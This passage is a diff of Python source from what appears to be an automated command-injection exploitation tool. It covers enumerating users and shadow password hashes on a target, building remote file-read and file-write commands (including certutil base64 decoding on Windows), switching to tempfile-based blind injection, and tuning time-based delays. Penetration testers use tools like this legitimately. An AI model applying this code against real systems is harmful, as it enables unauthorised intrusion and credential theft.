+      if not menu.options.no_logging:
+        info_msg = info_msg + settings.END_LINE.LF
+        output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
+  else:
+    warn_msg = "Failed to fetch underlying operating system information."
+    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+
+"""
+Print enumeration info msgs
+"""
+class print_enumenation():
+  def ps_version_msg(self):
+    info_msg = "Fetching powershell version."
+    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+
+  def hostname_msg(self):
+    info_msg = "Fetching hostname."
+    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+
+  def current_user_msg(self):
+    info_msg = "Fetching current user."
+    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+
+  def check_privs_msg(self):
+    info_msg = "Testing whether the current user has elevated privileges."
+    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+
+  def os_info_msg(self):
+    info_msg = "Fetching underlying operating system information."
+    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+
+  def print_users_msg(self):
+    if settings.TARGET_OS == settings.OS.WINDOWS:
+      info_msg = "Executing the 'net user' command "
+    else:
+      info_msg = "Fetching contents of the file '" + settings.PASSWD_FILE + "' "
+    info_msg += "to enumerate operating system users. "
+    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+
+  def print_passes_msg(self):
+    info_msg = "Fetching contents of the file '" + settings.SHADOW_FILE + "' "
+    info_msg += "to enumerate operating system users password hashes. "
+    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+
+  def print_single_os_cmd_msg(self, cmd):
+    info_msg =  "Executing user-supplied command '" + cmd + "'."
+    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+
+"""
+Print users enumeration.
+"""
+def print_users(sys_users, filename, _, separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell):
+  # Windows users enumeration.
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    try:
+      if sys_users and any(account in sys_users for account in settings.DEFAULT_WIN_USERS):
+        sys_users = "".join(str(p) for p in sys_users).strip()
+        sys_users_list = re.findall(r"(.*)", sys_users)
+        sys_users_list = "".join(str(p) for p in sys_users_list).strip()
+        sys_users_list = ' '.join(sys_users_list.split())
+        sys_users_list = sys_users_list.split()
+        if len(sys_users_list) != 0 :
+          if settings.VERBOSITY_LEVEL == 0 and _:
+            settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
+          info_msg = "Identified operating system"
+          info_msg += " user" + ('s', '')[len(sys_users_list) == 1]
+          info_msg += " [" + str(len(sys_users_list)) + "]:"
+          settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
+          # Add infos to logs file.
+          with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
+            if not menu.options.no_logging:
+              output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
+          count = 0
+          for user in range(0, len(sys_users_list)):
+            count = count + 1
+            is_privileged = is_privileged = ""
+            settings.print_data_to_stdout(settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") '" + Style.BRIGHT +  sys_users_list[user] + Style.RESET_ALL + "'" + Style.BRIGHT + is_privileged + Style.RESET_ALL)
+            # Add infos to logs file.
+            with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
+              if not menu.options.no_logging:
+                if count == 1 :
+                  output_file.write(settings.END_LINE.LF)
+                output_file.write("(" +str(count)+ ") '" + sys_users_list[user] + is_privileged + "'" + settings.END_LINE.LF )
+      else:
+        warn_msg = "It seems you do not have permission to enumerate operating system users."
+        settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+    except TypeError:
+      pass
+    except IndexError:
+      warn_msg = "It seems you do not have permission to enumerate operating system users."
+      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+      pass
+
+  # Unix-like users enumeration.
+  else:
+    try:
+      if sys_users:
+        sys_users = "".join(str(p) for p in sys_users).strip()
+        if len(sys_users.split(settings.SINGLE_WHITESPACE)) <= 1 :
+          sys_users = sys_users.split(settings.END_LINE.LF)
+        else:
+          sys_users = sys_users.split(settings.SINGLE_WHITESPACE)
+        # Check for appropriate '/etc/passwd' format.
+        if len(sys_users) % 3 != 0 :
+          warn_msg = "It seems '" + settings.PASSWD_FILE + "' file is "
+          warn_msg += "not in the appropriate format. Thus, exporting it as a text file."
+          settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+          sys_users = " ".join(str(p) for p in sys_users).strip()
+          settings.print_data_to_stdout(sys_users)
+          with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
+            if not menu.options.no_logging:
+              output_file.write("      " + sys_users)
+        else:
+          sys_users_list = []
+          for user in range(0, len(sys_users), 3):
+             sys_users_list.append(sys_users[user : user + 3])
+          if len(sys_users_list) != 0 :
+            if settings.VERBOSITY_LEVEL == 0 and _:
+              settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
+            info_msg = "Identified operating system"
+            info_msg += " user" + ('s', '')[len(sys_users_list) == 1]
+            info_msg += " [" + str(len(sys_users_list)) + "]:"
+            settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
+            # Add infos to logs file.
+            with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
+              if not menu.options.no_logging:
+                output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
+            count = 0
+            for user in range(0, len(sys_users_list)):
+              sys_users = sys_users_list[user]
+              sys_users = ":".join(str(p) for p in sys_users)
+              count = count + 1
+              fields = sys_users.split(":")
+              # System users privileges enumeration
+              try:
+                if not fields[2].startswith("/"):
+                  raise ValueError()
+                if menu.options.privileges:
+                  if int(fields[1]) == 0:
+                    is_privileged = Style.RESET_ALL + "is" +  Style.BRIGHT + " root user "
+                    is_privileged_nh = " is root user "
+                  elif int(fields[1]) > 0 and int(fields[1]) < 99 :
+                    is_privileged = Style.RESET_ALL + "is" +  Style.BRIGHT + " system user "
+                    is_privileged_nh = " is system user "
+                  elif int(fields[1]) >= 99 and int(fields[1]) < 65534 :
+                    if int(fields[1]) == 99 or int(fields[1]) == 60001 or int(fields[1]) == 65534:
+                      is_privileged = Style.RESET_ALL + "is" +  Style.BRIGHT + " anonymous user "
+                      is_privileged_nh = " is anonymous user "
+                    elif int(fields[1]) == 60002:
+                      is_privileged = Style.RESET_ALL + "is" +  Style.BRIGHT + " non-trusted user "
+                      is_privileged_nh = " is non-trusted user "
+                    else:
+                      is_privileged = Style.RESET_ALL + "is" +  Style.BRIGHT + " regular user "
+                      is_privileged_nh = " is regular user "
+                  else :
+                    is_privileged = ""
+                    is_privileged_nh = ""
+                else :
+                  is_privileged = ""
+                  is_privileged_nh = ""
+                settings.print_data_to_stdout(settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") '" + Style.BRIGHT + fields[0] + Style.RESET_ALL + "' " + Style.BRIGHT + is_privileged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'.")
+                # Add infos to logs file.
+                with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
+                  if not menu.options.no_logging:
+                    if count == 1 :
+                      output_file.write(settings.END_LINE.LF)
+                    output_file.write("(" +str(count)+ ") '" + fields[0] + "' " + is_privileged_nh + "(uid=" + fields[1] + "). Home directory is in '" + fields[2] + "'." + settings.END_LINE.LF)
+              except ValueError:
+                if count == 1 :
+                  warn_msg = "It seems '" + settings.PASSWD_FILE + "' file is not in the "
+                  warn_msg += "appropriate format. Thus, exporting it as a text file."
+                  settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+                sys_users = " ".join(str(p) for p in sys_users.split(":"))
+                settings.print_data_to_stdout(sys_users)
+                with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
+                  if not menu.options.no_logging:
+                    output_file.write("      " + sys_users)
+      else:
+        warn_msg = "It seems you do not have permission "
+        warn_msg += "to read the contents of the file '" + settings.PASSWD_FILE + "'."
+        settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+    except TypeError:
+      pass
+    except IndexError:
+      warn_msg = "Some kind of WAF/IPS probably blocks the attempt to read '"
+      warn_msg += settings.PASSWD_FILE + "' to enumerate operating system users."
+      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+      pass
+
+"""
+Print users enumeration.
+"""
+def print_passes(sys_passes, filename, _, alter_shell):
+  if sys_passes == "":
+    sys_passes = settings.SINGLE_WHITESPACE
+    sys_passes = sys_passes.replace(settings.SINGLE_WHITESPACE, settings.END_LINE.LF).split()
+    if len(sys_passes) != 0 :
+      if settings.VERBOSITY_LEVEL == 0 and _:
+        settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
+      info_msg = "Identified operating system"
+      info_msg += " user" + ('s', '')[len(sys_passes) == 1]
+      info_msg += " password hashes [" + str(len(sys_passes)) + "]:"
+      settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
+      # Add infos to logs file.
+      with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
+        if not menu.options.no_logging:
+          output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg )
+      count = 0
+      for line in sys_passes:
+        count = count + 1
+        try:
+          if ":" in line:
+            fields = line.split(":")
+            if not "*" in fields[1] and not "!" in fields[1] and fields[1] != "":
+              settings.print_data_to_stdout("  (" +str(count)+ ") " + Style.BRIGHT + fields[0] + Style.RESET_ALL + " : " + Style.BRIGHT + fields[1]+ Style.RESET_ALL)
+              # Add infos to logs file.
+              with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
+                if not menu.options.no_logging:
+                  if count == 1 :
+                    output_file.write(settings.END_LINE.LF)
+                  output_file.write("(" +str(count)+ ") " + fields[0] + " : " + fields[1] + settings.END_LINE.LF)
+        # Check for appropriate '/etc/shadow' format.
+        except IndexError:
+          if count == 1 :
+            warn_msg = "It seems '" + settings.SHADOW_FILE + "' file is not "
+            warn_msg += "in the appropriate format. Thus, exporting it as a text file."
+            settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+          settings.print_data_to_stdout(fields[0])
+          with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
+            if not menu.options.no_logging:
+              output_file.write("      " + fields[0])
+    else:
+      warn_msg = "It seems you do not have permission "
+      warn_msg += "to read the contents of the file '" + settings.SHADOW_FILE + "'."
+      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+
+"""
+Print single OS command
+"""
+def print_single_os_cmd(cmd, output, filename):
+  if len(output) > 1:
+    _ = "'" + cmd + "' execution output"
+    settings.print_data_to_stdout(settings.print_retrieved_data(_, output))
+    try:
+      with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
+        if not menu.options.no_logging:
+          output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + "User-supplied command " + _ + ": " + str(output.encode(settings.DEFAULT_CODEC).decode()) + settings.END_LINE.LF)
+    except TypeError:
+      pass
+  else:
+    err_msg = common.invalid_cmd_output(cmd)
+    settings.print_data_to_stdout(settings.print_error_msg(err_msg))
+
+"""
+Quote provided cmd
+"""
+def quoted_cmd(cmd):
+  cmd = "\"" + cmd + "\""
+  return cmd
+
+"""
+Escape file content for a double-quoted "printf" argument.
+"""
+def escape_file_content(content):
+  content = content.replace("\\", "\\\\")
+  content = content.replace("\"", "\\\"")
+  content = content.replace("$", "\\$")
+  content = content.replace("`", "\\`")
+  content = content.replace("%", "%%")
+  content = content.replace(settings.END_LINE.LF, "\\n")
+  return content
+
+"""
+Add new "cmd /c"
+"""
+def add_new_cmd(cmd):
+  cmd = "cmd /c " + cmd
+  return cmd
+
+"""
+Escape single quoted cmd
+"""
+def escape_single_quoted_cmd(cmd):
+  cmd = cmd.replace("'","\\'")
+  return cmd
+
+"""
+Find filename
+"""
+def find_filename(dest_to_write, content):
+  # Build absolute paths to avoid relying on the shell's working directory.
+  norm_dest = dest_to_write.replace("\\", "/")
+  dirpath = os.path.dirname(norm_dest)
+  fname = norm_dest
+  tmp_fname = (dirpath + "/" if dirpath else "") + os.path.basename(norm_dest) + "_tmp"
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    cmd = settings.WIN_FILE_WRITE_OPERATOR  + tmp_fname.replace("\\","\\\\") + settings.SINGLE_WHITESPACE + "'" + content + "'"
+  else:
+    cmd = settings.FILE_WRITE + content + settings.FILE_WRITE_OPERATOR + tmp_fname
+  return fname, tmp_fname, cmd
+
+"""
+Decode base 64 encoding
+"""
+def win_decode_b64_enc(fname, tmp_fname):
+  cmd = settings.CERTUTIL_DECODE_CMD + tmp_fname.replace("\\","\\\\") + settings.SINGLE_WHITESPACE + fname.replace("\\","\\\\")
+  return cmd
+
+"""
+Add command substitution on provided command
+"""
+def add_command_substitution(cmd):
+  cmd = "echo $(" + cmd + ")"
+  return cmd
+
+"""
+Remove command substitution on provided command
+"""
+def remove_command_substitution(cmd):
+  cmd = cmd.replace("echo $(", "").replace(")", "")
+  return cmd
+
+def remove_parenthesis(cmd):
+  cmd = cmd.replace("(", "").replace(")", "")
+  return cmd
+
+"""
+Write the file content
+"""
+def write_content(content, dest_to_write):
+  content = quoted_cmd(content)
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    cmd = settings.WIN_FILE_WRITE_OPERATOR  + dest_to_write.replace("\\","\\\\") + settings.SINGLE_WHITESPACE + "'" + content + "'"
+  else:
+    cmd = settings.FILE_WRITE + content + settings.FILE_WRITE_OPERATOR + dest_to_write
+  return cmd
+
+"""
+Delete filename
+"""
+def delete_tmp(tmp_fname):
+  cmd = settings.WIN_DEL + tmp_fname.replace("\\","\\\\")
+  return cmd
+
+"""
+Check if file exists.
+"""
+def check_file(remote_file_path):
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    cmd = settings.FILE_LIST_WIN + remote_file_path.replace("\\","\\\\")
+  else:
+    cmd = settings.FILE_LIST + remote_file_path
+    cmd = add_command_substitution(cmd)
+  return cmd
+
+"""
+File content to read.
+"""
+def file_content_to_read():
+  file_to_read = menu.options.file_read
+  info_msg = "Fetching contents of the file: '"
+  info_msg += file_to_read + "'."
+  settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    cmd = settings.WIN_FILE_READ + file_to_read.replace("\\","\\\\")
+  else:
+    if settings.EVAL_BASED_STATE:
+      cmd = "(" + settings.FILE_READ + file_to_read + ")"
+    else:
+      cmd = settings.FILE_READ + file_to_read
+  return cmd, file_to_read
+
+"""
+Cheap pre-check for file existence/non-emptiness before full extraction.
+"""
+def file_readable(separator, timesec, http_request_method, url, vuln_parameter, whitespace, prefix, suffix, url_time_response, file_to_read, technique):
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    return True
+  if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
+    from src.core.injections.blind.techniques.time_based import tb_payloads as payloads
+  else:
+    from src.core.injections.semiblind.techniques.tempfile_based import tfb_payloads as payloads
+  payload = payloads.condition_check(separator, "-s " + file_to_read, timesec, http_request_method)
+  if payload is None:
+    return True
+  exec_time, _, _, _, _ = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
+  return time_related_shell(url_time_response, exec_time, timesec)
+
+"""
+File read status
+"""
+def file_read_status(shell, file_to_read, filename):
+  if shell:
+    _ = "Retrieved file content"
+    settings.print_data_to_stdout(settings.print_retrieved_data(_, shell))
+    if not menu.options.no_logging:
+      with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
+        info_msg = "Extracted content of the file '"
+        info_msg += file_to_read + "' : " + shell + settings.END_LINE.LF
+        output_file.write(re.compile(settings.ANSI_COLOR_REMOVAL).sub("",settings.INFO_BOLD_SIGN) + info_msg)
+  else:
+    warn_msg = "Retrieved no content for the file '" + file_to_read + "'. "
+    warn_msg += "This could mean the file does not exist, is empty, or you do not have permission to read it."
+    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+
+"""
+Build the final destination path for file write operations.
+"""
+def check_destination(destination):
+  where = menu.options.file_write
+  # Normalize path separators before splitting.
+  normalized = destination.replace("\\", "/")
+  # A destination with no trailing filename is a directory, so append the local filename.
+  if os.path.split(normalized)[1] == "":
+    _ = os.path.split(normalized)[0].rstrip("/") + "/" + os.path.split(where)[1]
+  else:
+    _ = destination
+  return _
+
+"""
+Write the content of a local file to a remote destination.
+"""
+def check_file_to_write():
+  file_to_write = menu.options.file_write
+  if not os.path.exists(file_to_write):
+    err_msg = "The specified local file '" + file_to_write + "' does not exist."
+    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+    raise SystemExit()
+
+  if os.path.isfile(file_to_write):
+    try:
+      with open(file_to_write, 'r', encoding=settings.DEFAULT_CODEC) as content_file:
+        content = content_file.read()
+    except (OSError, UnicodeDecodeError) as err:
+      err_msg = "Unable to read the local file '" + file_to_write + "' (" + str(err) + "). "
+      err_msg += "Note that '--file-write' does not support binary files."
+      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+      raise SystemExit()
+    content = content.replace(settings.END_LINE.CRLF, settings.END_LINE.LF).replace(settings.END_LINE.CR, settings.END_LINE.LF)
+    if settings.TARGET_OS == settings.OS.WINDOWS:
+      import base64
+      content = base64.b64encode(content.encode(settings.DEFAULT_CODEC)).decode()
+    else:
+      content = escape_file_content(content)
+  else:
+    warn_msg = "The specified path '" + file_to_write + "' is not a file."
+    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+    settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
+    raise SystemExit()
+
+  dest_to_write = check_destination(destination=menu.options.file_dest)
+  info_msg = "Attempting to write the contents of file '"
+  info_msg += file_to_write + "' to the remote directory '" + dest_to_write + "'."
+  settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+  return file_to_write, dest_to_write, content
+
+"""
+Display the result of an attempted file write to the remote target.
+"""
+def file_write_status(shell, dest_to_write):
+  if shell:
+    info_msg = "The file has been successfully created in remote directory: '" + dest_to_write + "'."
+    settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
+  else:
+    warn_msg = "The file does not appear to exist in the remote directory '" + dest_to_write + "'. "
+    warn_msg += "This could mean the write failed, or you do not have permission to write to that directory."
+    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+
+
+def define_vulnerable_http_header(http_header_name):
+  if http_header_name == settings.USER_AGENT.lower():
+    settings.USER_AGENT_INJECTION = True
+  elif http_header_name == settings.REFERER.lower():
+    settings.REFERER_INJECTION = True
+  elif http_header_name == settings.HOST.lower():
+    settings.HOST_INJECTION = True
+  return http_header_name
+
+"""
+Check for wrong flags
+"""
+def check_wrong_flags():
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    if menu.options.is_root :
+      warn_msg = "Identified the target as Windows. Switching "
+      warn_msg += "'--is-root' to '--is-admin'."
+      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+    if menu.options.passwords:
+      warn_msg = "The '--passwords' option is not yet supported on Windows targets."
+      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+  else:
+    if menu.options.is_admin :
+      warn_msg = "Identified the target as Unix-like. Switching "
+      warn_msg += "'--is-admin' to '--is-root'. "
+      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+
+"""
+Set writable path name
+"""
+def setting_writable_dir(path):
+    if settings.VERBOSITY_LEVEL != 0:
+      debug_msg = "Using '" + path + "' for writable directory."
+      settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
+    info_msg = "Attempting to create a file in directory '" + path
+    info_msg += "' for command execution output. "
+    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+
+"""
+Define python working dir (for windows targets)
+"""
+def define_py_working_dir():
+  if settings.TARGET_OS == settings.OS.WINDOWS and menu.options.alter_shell:
+    while True:
+      message = "Do you want to use '" + settings.WIN_PYTHON_INTERPRETER
+      message += "' as Python working directory on the target host? [Y/n] "
+      python_dir = common.read_input(message, default="Y", check_batch=True)
+      if python_dir in settings.CHOICE_YES:
+        break
+      elif python_dir in settings.CHOICE_NO:
+        message = "Please provide a custom working directory for Python (e.g. '"
+        message += settings.WIN_PYTHON_INTERPRETER + "') "
+        settings.WIN_PYTHON_INTERPRETER = common.read_input(message, default=None, check_batch=True)
+        break
+      else:
+        common.invalid_option(python_dir)
+        pass
+    settings.USER_DEFINED_PYTHON_DIR = True
+
+"""
+Checks for identified vulnerable parameter
+"""
+def identified_vulnerable_param(url, technique, injection_type, vuln_parameter, payload, http_request_method, filename, export_injection_info, vp_flag, counter):
+  # Check injection state
+  settings.DETECTION_PHASE = False
+  settings.EXPLOITATION_PHASE = True
+  if settings.COOKIE_INJECTION == True:
+    header_name = settings.SINGLE_WHITESPACE + settings.COOKIE
+    found_vuln_parameter = vuln_parameter
+    the_type = " parameter"
+
+  elif settings.USER_AGENT_INJECTION == True:
+    header_name = settings.SINGLE_WHITESPACE + settings.USER_AGENT
+    found_vuln_parameter = ""
+    the_type = " HTTP header"
+
+  elif settings.REFERER_INJECTION == True:
+    header_name = settings.SINGLE_WHITESPACE + settings.REFERER
+    found_vuln_parameter = ""
+    the_type = " HTTP header"
+
+  elif settings.HOST_INJECTION == True:
+    header_name = settings.SINGLE_WHITESPACE + settings.HOST
+    found_vuln_parameter = ""
+    the_type = " HTTP header"
+
+  elif settings.CUSTOM_HEADER_INJECTION == True:
+    header_name = settings.SINGLE_WHITESPACE + settings.CUSTOM_HEADER_NAME
+    found_vuln_parameter = ""
+    the_type = " HTTP header"
+
+  else:
+    header_name = ""
+    the_type = " parameter"
+    # Check if defined POST data
+    if not settings.USER_DEFINED_POST_DATA or settings.IGNORE_USER_DEFINED_POST_DATA:
+      found_vuln_parameter = parameters.vuln_GET_param(url)
+    else :
+      found_vuln_parameter = vuln_parameter
+
+  if len(found_vuln_parameter) != 0 :
+    found_vuln_parameter = " '" +  found_vuln_parameter + Style.RESET_ALL  + Style.BRIGHT + "'"
+
+  # Print the findings to log file.
+  if export_injection_info == False:
+    export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)
+  if vp_flag == True:
+    vp_flag = logs.add_parameter(vp_flag, filename, the_type, header_name, http_request_method, vuln_parameter, payload)
+  logs.update_payload(filename, counter, payload)
+  counter = counter + 1
+
+  if not settings.LOAD_SESSION:
+    if settings.VERBOSITY_LEVEL == 0:
+      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
+    else:
+      total_of_requests()
+
+  # Print the findings to terminal.
+  info_msg = settings.CHECKING_PARAMETER + " appears to be injectable via "
+  info_msg += "(" + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ") " + technique + "."
+  settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
+  sub_content = str(url_decode(payload))
+  settings.print_data_to_stdout(settings.print_sub_content(sub_content))
+
+"""
+Finalize injection process
+"""
+def finalize(exit_loops, no_result, float_percent, injection_type, technique, shell):
+  if exit_loops == False:
+    if settings.VERBOSITY_LEVEL == 0:
+      percent = print_percentage(float_percent, no_result, shell)
+      injection_process(injection_type, technique, percent)
+      return True
+    else:
+      return True
+  else:
+    return False
+
+"""
+Normalize a directory path for the target OS
+"""
+def normalize_target_dir(path):
+  if not path:
+    return path
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    path = path.replace("/", "\\")
+    if not path.endswith("\\"):
+      path += "\\"
+  else:
+    path = path.replace("\\", "/")
+    if not path.endswith("/"):
+      path += "/"
+  return path
+
+"""
+Provide custom server's root directory
+"""
+def custom_web_root(url, timesec, filename, http_request_method, url_time_response):
+  if not settings.CUSTOM_WEB_ROOT:
+    # Prefer the already-detected default over the generic one.
+    if settings.WEB_ROOT:
+      default_root_dir = settings.WEB_ROOT
+    elif settings.TARGET_OS == settings.OS.WINDOWS :
+      default_root_dir = settings.WINDOWS_DEFAULT_DOC_ROOTS[0]
+    else:
+      default_root_dir = settings.LINUX_DEFAULT_DOC_ROOTS[0].replace(settings.DOC_ROOT_TARGET_MARK,settings.TARGET_URL)
+    message = "Enter a writable directory to use for file operations (e.g. '"
+    message += default_root_dir + "') "
+    settings.WEB_ROOT = common.read_input(message, default=default_root_dir, check_batch=True)
+    if len(settings.WEB_ROOT) == 0:
+      settings.WEB_ROOT = default_root_dir
+    settings.CUSTOM_WEB_ROOT = True
+
+  if not settings.LOAD_SESSION:
+    path = settings.WEB_ROOT
+    setting_writable_dir(path)
+  menu.options.web_root = settings.WEB_ROOT.strip()
+
+
+"""
+Return TEMP path for win / *nix targets.
+"""
+def check_tmp_path(url, timesec, filename, http_request_method, url_time_response):
+  # Set temp path
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    if "microsoft-iis" in settings.SERVER_BANNER.lower():
+      settings.TMP_PATH = "C:\\Windows\\TEMP\\"
+    else:
+      settings.TMP_PATH = "%temp%\\"
+  else:
+    settings.TMP_PATH = "/tmp/"
+
+  if menu.options.tmp_path:
+    tmp_path = menu.options.tmp_path
+  else:
+    tmp_path = settings.TMP_PATH
+  tmp_path = normalize_target_dir(tmp_path)
+
+  if not settings.LOAD_SESSION and settings.DEFAULT_WEB_ROOT != settings.WEB_ROOT:
+    settings.WEB_ROOT = settings.DEFAULT_WEB_ROOT
+
+  settings.CALL_TMP_BASED = False
+  if menu.options.file_dest and '/tmp/' in menu.options.file_dest:
+    settings.CALL_TMP_BASED = True
+
+  if menu.options.web_root:
+    settings.WEB_ROOT = menu.options.web_root
+  else:
+    # Provide custom server's root directory.
+    custom_web_root(url, timesec, filename, http_request_method, url_time_response)
+
+  settings.WEB_ROOT = normalize_target_dir(settings.WEB_ROOT)
+  menu.options.web_root = settings.WEB_ROOT
+
+  return tmp_path
+
+"""
+Check if file-based technique has failed,
+then use the "/tmp/" directory for tempfile-based technique.
+"""
+def tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response):
+  if no_result == True:
+    from src.core.injections.semiblind.techniques.tempfile_based import tfb_handler
+    path = tmp_path
+    setting_writable_dir(path)
+    # Runs mid file-based-technique, so label the detour or it reads as file-based's
+    # own result showing up in the wrong place.
+    info_msg = "Switching to the tempfile-based injection technique."
+    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+    settings.SKIP_NEXT_TECHNIQUE_TITLE = settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED
+    call_tfb = tfb_handler.exploitation(url, timesec, filename, tmp_path, http_request_method, url_time_response)
+    if call_tfb == False:
+      info_msg = "Resuming the file-based command injection technique tests."
+      settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+    return call_tfb
+  else:
+    settings.print_data_to_stdout(settings.END_LINE.CR)
+
+"""
+Check if to use the "/tmp/" directory for tempfile-based technique.
+"""
+def use_temp_folder(no_result, url, timesec, filename, http_request_method, url_time_response):
+  tmp_path = check_tmp_path(url, timesec, filename, http_request_method, url_time_response)
+  while True:
+    message = "Insufficient permissions on directory '" + settings.WEB_ROOT + "'. "
+    message += "Do you want to use '" + tmp_path + "' instead? [Y/n] "
+    tmp_upload = common.read_input(message, default="Y", check_batch=True)
+    if tmp_upload in settings.CHOICE_YES:
+      exit_loops = True
+      settings.TEMPFILE_BASED_STATE = True
+      call_tfb = tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response)
+      if call_tfb != False:
+        return True
+      else:
+        if no_result == True:
+          return False
+        else:
+          return True
+    elif tmp_upload in settings.CHOICE_NO:
+      break
+    elif tmp_upload in settings.CHOICE_QUIT:
+      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
+      raise
+    else:
+      common.invalid_option(tmp_upload)
+      pass
+  # continue
+
+"""
+Adjusts the timesec delay
+"""
+def time_related_timesec():
+  # Scale the floor by confirmed instability.
+  if settings.UNSTABLE_REQUEST_CHOICE:
+    min_safe_delay = max(settings.MIN_SAFE_TIMESEC_UNSTABLE, settings.UNSTABLE_REQUEST_BUMPS)
+  else:
+    min_safe_delay = settings.MIN_SAFE_TIMESEC
+  # Never start below the measured baseline, or normal slow responses look delayed.
+  # x2: detection-phase checks run before the adaptive baseline has enough samples to take over, so this flat margin needs to hold up on its own.
+  if settings.URL_TIME_RESPONSE:
+    min_safe_delay = max(min_safe_delay, settings.URL_TIME_RESPONSE + settings.TIME_DELAY_STEP * 2)
+  if settings.TIME_RELATED_ATTACK and settings.TIMESEC < min_safe_delay:
+    if settings.VERBOSITY_LEVEL != 0:
+      debug_msg = "Adjusting '--time-sec' to minimum safe delay of " + str(min_safe_delay) + " second" + ("s" if min_safe_delay > 1 else "") + ". In case of inconsistencies, it will be auto-increased."
+      settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
+    return min_safe_delay
+  else:
+    return max(settings.TIMESEC, min_safe_delay)
+
+"""
+Export the time related injection results
+"""
+def time_related_export_injection_results(cmd, separator, output, check_exec_time):
+  if settings.VERBOSITY_LEVEL == 0:
+    settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
+  if output != "" and check_exec_time != 0 :
+    info_msg = "Finished in " + time.strftime('%H:%M:%S', time.gmtime(check_exec_time)) + "."
+    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+  else:
+    # Could be separator filtration on target host, or simply an invalid/wrong command.
+    if output != False :
+      err_msg = "The '" + cmd + "' command did not return any output. This could be due to "
+      err_msg += "'" + separator + "' filtration on the target host, or the command itself "
+      err_msg += "being invalid."
+      if not menu.options.alter_shell:
+        err_msg += " If you're confident it's valid, try the '--alter-shell' option or another injection technique."
+      else:
